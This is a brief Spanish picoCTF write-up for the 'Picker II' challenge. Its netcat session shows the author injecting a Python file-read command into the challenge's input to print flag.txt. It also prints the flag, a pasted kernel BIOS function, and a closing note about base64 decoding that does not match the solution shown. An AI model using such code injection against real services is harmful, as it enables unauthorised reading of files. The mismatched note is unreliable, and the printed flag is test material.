## Description

Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 61535`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/523/picker-II.py).
#### Hints
- Can you do what `win` does with your input to the program?
## Solución

```shell
┌──(kali㉿kali)-[~/mrrobot/reversing/parte2/picker2]
└─$ nc saturn.picoctf.net 61535

==> esoteric1

  int query_apm_bios(void)
{
        struct biosregs ireg, oreg;

        /* APM BIOS installation check */
        initregs(&ireg);
        ireg.ah = 0x53;
        intcall(0x15, &ireg, &oreg);

        if (oreg.flags & X86_EFLAGS_CF)
                return -1;              /* No APM BIOS */

        if (oreg.bx != 0x504d)          /* "PM" signature */
                return -1;

        if (!(oreg.cx & 0x02))          /* 32 bits supported? */
                return -1;

        /* Disconnect first, just in case */
        ireg.al = 0x04;
        intcall(0x15, &ireg, NULL);

        /* 32-bit connect */
        ireg.al = 0x03;
        intcall(0x15, &ireg, &oreg);

        boot_params.apm_bios_info.cseg        = oreg.ax;
        boot_params.apm_bios_info.offset      = oreg.ebx;
        boot_params.apm_bios_info.cseg_16     = oreg.cx;
        boot_params.apm_bios_info.dseg        = oreg.dx;
        boot_params.apm_bios_info.cseg_len    = oreg.si;
        boot_params.apm_bios_info.cseg_16_len = oreg.hsi;
        boot_params.apm_bios_info.dseg_len    = oreg.di;

        if (oreg.flags & X86_EFLAGS_CF)
                return -1;

        /* Redo the installation check as the 32-bit connect;
           some BIOSes return different flags this way... */

        ireg.al = 0x00;
        intcall(0x15, &ireg, &oreg);

        if ((oreg.eflags & X86_EFLAGS_CF) || oreg.bx != 0x504d) {
                /* Failure with 32-bit connect, try to disconnect and ignore */
                ireg.al = 0x04;
                intcall(0x15, &ireg, NULL);
                return -1;
        }

        boot_params.apm_bios_info.version = oreg.ax;
        boot_params.apm_bios_info.flags   = oreg.cx;
        return 0;
}
  
==> print(open('flag.txt', 'r').read())
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
'NoneType' object is not callable
                                                                                  
┌──(kali㉿kali)-[~/mrrobot/reversing/parte2/picker2]
└─$

```
## Bandera
```css
: picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
```
## Notas Adicionales

Mandamos a cyberchef la parte del ``String expected`` from base64 y url decode para finalmente obtener la bandera 

## Referencias
- 